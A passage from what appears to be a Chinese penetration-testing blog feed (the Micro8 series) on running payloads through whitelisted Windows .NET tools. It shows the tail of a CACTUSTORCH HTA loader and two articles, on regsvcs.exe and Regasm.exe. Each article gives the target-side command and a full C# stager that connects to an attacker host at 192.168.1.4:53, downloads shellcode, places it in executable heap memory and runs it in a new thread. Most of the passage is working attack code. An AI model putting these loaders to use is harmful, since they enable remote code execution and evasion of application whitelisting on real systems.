o</span><br><span class="line"></span><br><span class="line">Set fmt = CreateObject(&quot;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&quot;)</span><br><span class="line"></span><br><span class="line">Set al = CreateObject(&quot;System.Collections.ArrayList&quot;)</span><br><span class="line"></span><br><span class="line">al.Add fmt.SurrogateSelector</span><br><span class="line"></span><br><span class="line">Set d = fmt.Deserialize_2(Base64ToStream(s))</span><br><span class="line"></span><br><span class="line">Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)</span><br><span class="line"></span><br><span class="line">o.flame binary,code</span><br><span class="line"></span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">SetVersion</span><br><span class="line"></span><br><span class="line">On Error Resume Next</span><br><span class="line"></span><br><span class="line">Run</span><br><span class="line"></span><br><span class="line">If Err.Number &lt;&gt; 0 Then</span><br><span class="line"></span><br><span class="line">Debug Err.Description</span><br><span class="line"></span><br><span class="line">Err.Clear</span><br><span class="line"></span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">self.close</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>来源：</strong><br><a href="https://raw.githubusercontent.com/mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.hta" target="_blank" rel="noopener">https://raw.githubusercontent.com/mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.hta</a></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>74、基于白名单regsvcs.exe执行payload第四季</title>
      <link href="/article/74_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95regsvcs.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%9B%9B%E5%AD%A3.html"/>
      <url>/article/74_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95regsvcs.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%9B%9B%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<h3 id="Regsvcs简介："><a href="#Regsvcs简介：" class="headerlink" title="Regsvcs简介："></a>Regsvcs简介：</h3><p>Regsvcs为.NET服务安装工具，主要提供三类服务：  </p><ul><li>加载并注册程序集。  </li><li>生成、注册类型库并将其安装到指定的 COM+ 1.0 应用程序中。  </li><li>配置以编程方式添加到类的服务。  </li></ul><p><strong>说明：</strong>Regsvcs.exe所在路径没有被系统添加PATH环境变量中，因此，Regsvcs命令无法识别。</p><p>具体参考微软官方文档：<br><a href="https://docs.microsoft.com/en-us/dotnet/framework/tools/regsvcs-exe-net-services-installation-tool" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/dotnet/framework/tools/regsvcs-exe-net-services-installation-tool</a></p><p>基于白名单Regsvcs.exe配置payload：</p><p>Windows 7 默认位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe</span><br></pre></td></tr></table></figure><p><strong>攻击机：</strong>192.168.1.4 Debian<br><strong>靶机：</strong>192.168.1.3 Windows 7</p><h3 id="配置攻击机msf："><a href="#配置攻击机msf：" class="headerlink" title="配置攻击机msf："></a>配置攻击机msf：</h3><p><img src="../do/media/f80a8df6945621d36a5dd72bf623281a.jpg" alt></p><h3 id="靶机执行："><a href="#靶机执行：" class="headerlink" title="靶机执行："></a>靶机执行：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe Micropoor.dll</span><br></pre></td></tr></table></figure><p><img src="../do/media/5a929f376966814377cd69342c7f8f17.jpg" alt></p><h3 id="附录：Micropoor-cs"><a href="#附录：Micropoor-cs" class="headerlink" title="附录：Micropoor.cs"></a>附录：Micropoor.cs</h3><p><strong>注：x86 payload</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System; <span class="keyword">using</span> System.Net; <span class="keyword">using</span> System.Linq; <span class="keyword">using</span> System.Net.Sockets; <span class="keyword">using</span> System.Runtime.InteropServices; <span class="keyword">using</span> System.Threading; <span class="keyword">using</span> System.EnterpriseServices; <span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phwUqeuTRSqn</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">mfBxqerbXgh</span> : <span class="title">ServicedComponent</span> &#123; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">mfBxqerbXgh</span>(<span class="params"></span>)</span> &#123; Console.WriteLine(<span class="string">"Micropoor"</span>); &#125; </span><br><span class="line"></span><br><span class="line">[<span class="meta">ComRegisterFunction</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">RegisterClass</span> (<span class="params"> <span class="keyword">string</span> DssjWsFMnwwXL </span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">uXsiCEXRzLNkI.BBNSohgZXGCaD();</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">[<span class="meta">ComUnregisterFunction</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">UnRegisterClass</span> (<span class="params"> <span class="keyword">string</span> DssjWsFMnwwXL </span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"> uXsiCEXRzLNkI.BBNSohgZXGCaD();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">uXsiCEXRzLNkI</span></span><br><span class="line"></span><br><span class="line">&#123; [DllImport(<span class="string">"kernel32"</span>)] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">HeapCreate</span>(<span class="params">UInt32 pAyHWx, UInt32 KXNJUcPIUymFNbJ, UInt32 MotkftcMAIJRnW</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">HeapAlloc</span>(<span class="params">UInt32 yjmmncJHBrUu, UInt32 MYjktCDxYrlTs, UInt32 zyBAwQVBQbi</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">RtlMoveMemory</span>(<span class="params">UInt32 PorEiXBhZkA, <span class="keyword">byte</span>[] UIkcqF, UInt32 wAXQEPCIVJQQb</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">UInt32 WNvQyYv, UInt32 vePRog, UInt32 Bwxjth, IntPtr ExkSdsTdwD, UInt32 KfNaMFOJVTSxbrR, <span class="keyword">ref</span> UInt32 QEuyYka</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params">IntPtr pzymHg, UInt32 lReJrqjtOqvkXk</span>)</span>;<span class="function"><span class="keyword">static</span> <span class="keyword">byte</span>[] <span class="title">SVMBrK</span>(<span class="params"><span class="keyword">string</span> MKwSjIxqTxxEO, <span class="keyword">int</span> jVaXWRxcmw</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">IPEndPoint hqbNYMZQr = <span class="keyword">new</span> IPEndPoint(IPAddress.Parse(MKwSjIxqTxxEO), jVaXWRxcmw);</span><br><span class="line"></span><br><span class="line">Socket LbLgipot = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123; LbLgipot.Connect(hqbNYMZQr); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">catch</span> &#123; <span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] VKQsLPgLmVdp = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">LbLgipot.Receive(VKQsLPgLmVdp, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> jbQtneZFbvzK = BitConverter.ToInt32(VKQsLPgLmVdp, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] cyDiPLJhiAQbw = <span class="keyword">new</span> <span class="keyword">byte</span>[jbQtneZFbvzK + <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> vyPloXEDJoylLbj = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (vyPloXEDJoylLbj &lt; jbQtneZFbvzK)</span><br><span class="line"></span><br><span class="line"> &#123; vyPloXEDJoylLbj += LbLgipot.Receive(cyDiPLJhiAQbw, vyPloXEDJoylLbj + <span class="number">5</span>, (jbQtneZFbvzK ‐ vyPloXEDJoylLbj) &lt; <span class="number">4096</span> ? (jbQtneZFbvzK ‐ vyPloXEDJoylLbj) : <span class="number">4096</span>, <span class="number">0</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] MkHUcy = BitConverter.GetBytes((<span class="keyword">int</span>)LbLgipot.Handle);</span><br><span class="line"></span><br><span class="line">Array.Copy(MkHUcy, <span class="number">0</span>, cyDiPLJhiAQbw, <span class="number">1</span>, <span class="number">4</span>); cyDiPLJhiAQbw[<span class="number">0</span>] = <span class="number">0xBF</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> cyDiPLJhiAQbw;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ZFeAPdN</span>(<span class="params"><span class="keyword">byte</span>[] hjErkNfmkyBq</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hjErkNfmkyBq != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">UInt32 xYfliOUgksPsv = HeapCreate(<span class="number">0x00040000</span>, (UInt32)hjErkNfmkyBq.Length, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">UInt32 eSiulXLtqQO = HeapAlloc(xYfliOUgksPsv, <span class="number">0x00000008</span>, (UInt32)hjErkNfmkyBq.Length);</span><br><span class="line"></span><br><span class="line">RtlMoveMemory(eSiulXLtqQO, hjErkNfmkyBq, (UInt32)hjErkNfmkyBq.Length);</span><br><span class="line"></span><br><span class="line">UInt32 NByrFgKjVjB = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">IntPtr PsIqQCvc = CreateThread(<span class="number">0</span>, <span class="number">0</span>, eSiulXLtqQO, IntPtr.Zero, <span class="number">0</span>, <span class="keyword">ref</span> NByrFgKjVjB);</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(PsIqQCvc, <span class="number">0xFFFFFFFF</span>);&#125;&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">BBNSohgZXGCaD</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] cyDiPLJhiAQbw = <span class="literal">null</span>; cyDiPLJhiAQbw = SVMBrK(<span class="string">"192.168.1.4"</span>, <span class="number">53</span>);</span><br><span class="line"></span><br><span class="line">ZFeAPdN(cyDiPLJhiAQbw);</span><br><span class="line"></span><br><span class="line">&#125; &#125; &#125;</span><br></pre></td></tr></table></figure><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>73、基于白名单Regasm.exe执行payload第三季</title>
      <link href="/article/73_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%B8%89%E5%AD%A3.html"/>
      <url>/article/73_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%B8%89%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<h3 id="Regasm简介："><a href="#Regasm简介：" class="headerlink" title="Regasm简介："></a>Regasm简介：</h3><p>Regasm 为程序集注册工具，读取程序集中的元数据，并将所需的项添加到注册表中。RegAsm.exe是Microsoft Corporation开发的合法文件进程。它与Microsoft.NET Assembly Registration Utility相关联。</p><p><strong>说明：</strong>Regasm.exe所在路径没有被系统添加PATH环境变量中，因此，REGASM命令无法识别。</p><p>具体参考微软官方文档：<br><a href="https://docs.microsoft.com/en-us/dotnet/framework/tools/regasm-exe-assembly-registration-tool" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/dotnet/framework/tools/regasm-exe-assembly-registration-tool</a></p><p>基于白名单Regasm.exe配置payload：</p><p>Windows 7 默认位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe</span><br></pre></td></tr></table></figure><p><strong>攻击机：</strong>192.168.1.4 Debian<br><strong>靶机：</strong>192.168.1.3 Windows 7</p><h3 id="配置攻击机msf："><a href="#配置攻击机msf：" class="headerlink" title="配置攻击机msf："></a>配置攻击机msf：</h3><p><img src="../do/media/314cbd2bd9ab4f06f2323a2cd8c0d624.jpg" alt></p><h3 id="靶机执行："><a href="#靶机执行：" class="headerlink" title="靶机执行："></a>靶机执行：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U Micropoor.dll</span><br></pre></td></tr></table></figure><p><img src="../do/media/868577dc3b5b517840363527f5b5ad2b.jpg" alt></p><h3 id="附录：Micropoor-cs"><a href="#附录：Micropoor-cs" class="headerlink" title="附录：Micropoor.cs"></a>附录：Micropoor.cs</h3><p><strong>注：x86 payload</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System; <span class="keyword">using</span> System.Net; <span class="keyword">using</span> System.Linq; <span class="keyword">using</span> System.Net.Sockets; <span class="keyword">using</span> System.Runtime.InteropServices; <span class="keyword">using</span> System.Threading; <span class="keyword">using</span> System.EnterpriseServices; <span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">HYlDKsYF</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">kxKhdVzWQXolmmF</span> : <span class="title">ServicedComponent</span> &#123; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">kxKhdVzWQXolmmF</span>(<span class="params"></span>)</span> &#123; Console.WriteLine(<span class="string">"doge"</span>); &#125; </span><br><span class="line"></span><br><span class="line">[<span class="meta">ComRegisterFunction</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">RegisterClass</span> (<span class="params"> <span class="keyword">string</span> pNNHrTZzW </span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">ZApOAKJKY.QYJOTklTwn();</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">[<span class="meta">ComUnregisterFunction</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">UnRegisterClass</span> (<span class="params"> <span class="keyword">string</span> pNNHrTZzW </span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">ZApOAKJKY.QYJOTklTwn();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ZApOAKJKY</span></span><br><span class="line"></span><br><span class="line">&#123; [DllImport(<span class="string">"kernel32"</span>)] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">HeapCreate</span>(<span class="params">UInt32 FJyyNB, UInt32 fwtsYaiizj, UInt32 dHJhaXQiaqW</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">HeapAlloc</span>(<span class="params">UInt32 bqtaDNfVCzVox, UInt32 hjDFdZuT, UInt32 JAVAYBFdojxsgo</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">RtlMoveMemory</span>(<span class="params">UInt32 AQdEyOhn, <span class="keyword">byte</span>[] wknmfaRmoElGo, UInt32 yRXPRezIkcorSOo</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">UInt32 uQgiOlrrBaR, UInt32 BxkWKqEKnp, UInt32 lelfRubuprxr, IntPtr qPzVKjdiF, UInt32 kNXJcS, <span class="keyword">ref</span> UInt32 atiLJcRPnhfyGvp</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params">IntPtr XSjyzoKzGmuIOcD, UInt32 VumUGj</span>)</span>;<span class="function"><span class="keyword">static</span> <span class="keyword">byte</span>[] <span class="title">HMSjEXjuIzkkmo</span>(<span class="params"><span class="keyword">string</span> aCWWUttzmy, <span class="keyword">int</span> iJGvqiEDGLhjr</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">IPEndPoint YUXVAnzAurxH = <span class="keyword">new</span> IPEndPoint(IPAddress.Parse(aCWWUttzmy), iJGvqiEDGLhjr);</span><br><span class="line"></span><br><span class="line">Socket MXCEuiuRIWgOYze = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123; MXCEuiuRIWgOYze.Connect(YUXVAnzAurxH); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">catch</span> &#123; <span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] Bjpvhc = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">MXCEuiuRIWgOYze.Receive(Bjpvhc, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> IETFBI = BitConverter.ToInt32(Bjpvhc, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] ZKSAAFwxgSDnTW = <span class="keyword">new</span> <span class="keyword">byte</span>[IETFBI + <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> JFPJLlk = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (JFPJLlk &lt; IETFBI)</span><br><span class="line"></span><br><span class="line">&#123; JFPJLlk += MXCEuiuRIWgOYze.Receive(ZKSAAFwxgSDnTW, JFPJLlk + <span class="number">5</span>, (IETFBI ‐ JFPJLlk) &lt; <span class="number">4096</span> ? (IETFBI ‐ JFPJLlk) : <span class="number">4096</span>, <span class="number">0</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] nXRztzNVwPavq = BitConverter.GetBytes((<span class="keyword">int</span>)MXCEuiuRIWgOYze.Handle);</span><br><span class="line"></span><br><span class="line">Array.Copy(nXRztzNVwPavq, <span class="number">0</span>, ZKSAAFwxgSDnTW, <span class="number">1</span>, <span class="number">4</span>); ZKSAAFwxgSDnTW[<span class="number">0</span>] = <span class="number">0xBF</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ZKSAAFwxgSDnTW;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">TOdKEwPYRUgJly</span>(<span class="params"><span class="keyword">byte</span>[] KNCtlJWAmlqJ</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (KNCtlJWAmlqJ != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">UInt32 uuKxFZFwog = HeapCreate(<span class="number">0x00040000</span>, (UInt32)KNCtlJWAmlqJ.Lengt h, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">UInt32 sDPjIMhJIOAlwn = HeapAlloc(uuKxFZFwog, <span class="number">0x00000008</span>, (UInt32)KNCtlJWAmlqJ.Length);</span><br><span class="line"></span><br><span class="line">RtlMoveMemory(sDPjIMhJIOAlwn, KNCtlJWAmlqJ, (UInt32)KNCtlJWAmlqJ.Length);</span><br><span class="line"></span><br><span class="line">UInt32 ijifOEfllRl = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">IntPtr ihXuoEirmz = CreateThread(<span class="number">0</span>, <span class="number">0</span>, sDPjIMhJIOAlwn, IntPtr.Zero, <span class="number">0</span>, <span class="keyword">ref</span> ijifOEfllRl);</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(ihXuoEirmz, <span class="number">0xFFFFFFFF</span>);&#125;&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">QYJOTklTwn</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] ZKSAAFwxgSDnTW = <span class="literal">null</span>; ZKSAAFwxgSDnTW = HMSjEXjuIzkkmo(<span class="string">"192.168.1.4"</span>, <span class="number">53</span>);</span><br><span class="line"></span><br><span class="line">TOdKEwPYRUgJly(ZKSAAFwxgSDnTW);</span><br><span class="line"></span><br><span class="line">&#125; &#125; &#125;</span><br></pre></td></tr></table></figure><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>72、基于白名单Installutil.exe执行payload第二季</title>
      <link href="/article/72_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%BA%8C%E5%AD%A3.html"/>
      <url>/article/72_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%BA%8C%E5%AD%A3.html</url>
      
